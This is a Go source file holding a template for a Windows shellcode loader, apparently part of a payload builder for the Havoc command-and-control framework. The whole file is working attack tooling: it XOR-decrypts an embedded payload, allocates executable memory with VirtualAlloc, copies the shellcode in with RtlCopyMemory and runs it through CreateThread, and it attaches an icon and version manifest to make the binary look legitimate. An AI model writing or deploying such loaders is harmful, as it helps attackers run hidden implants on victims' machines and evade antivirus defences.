package templates

var XorTmpl = `
//go:generate goversioninfo -icon={{ basepath }}/misc/pwned.ico -manifest={{ basepath }}/misc/goversioninfo.exe.manifest
package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32 = windows.MustLoadDLL("kernel32.dll")
	ntdll    = windows.MustLoadDLL("ntdll.dll")

	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	CreateThread  = kernel32.MustFindProc("CreateThread")
)

func decrypt(shellcode []byte, key string) []byte {
	keyBytes := []byte(key)
	keyLen := len(keyBytes)

	for i := 0; i < len(shellcode); i++ {
		shellcode[i] ^= keyBytes[i%keyLen]
	}
	return shellcode
}

func main() {

	key := "{{ key }}"

	// Payload havoc
	var shellcodeBytes = []byte{
		{{ shellcode }}
	}

	var shellcode []byte
	shellcode = decrypt(shellcodeBytes, key)

	addr, _, err := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	// retour d'erreur ( quand on appel la lib )
	// TODO improve error checking
	if err != nil && err.Error() != "L’opération a réussi." {
		fmt.Println("failed to alloc memory")
		fmt.Println(err)
		syscall.Exit(0)
	}

	_, _, err = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	// TODO improve error checking
	if err != nil && err.Error() != "L’opération a réussi." {
		fmt.Println("failed to copy in memory")
		fmt.Println(err)
		syscall.Exit(0)
	}

	// jump to shellcode
	_, _, err = CreateThread.Call(
		0,    // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		0,    // [in]            SIZE_T                  dwStackSize,
		addr, // shellcode address
		0,    // [in, optional]  __drv_aliasesMem LPVOID lpParameter,
		0,    // [in]            DWORD                   dwCreationFlags,
		0,    // [out, optional] LPDWORD                 lpThreadId
	)

	// TODO improve error checking
	if err != nil && err.Error() != "L’opération a réussi." {
		fmt.Println("failed to create thread")
		fmt.Println(err)
	}

	for {
	}
}
`
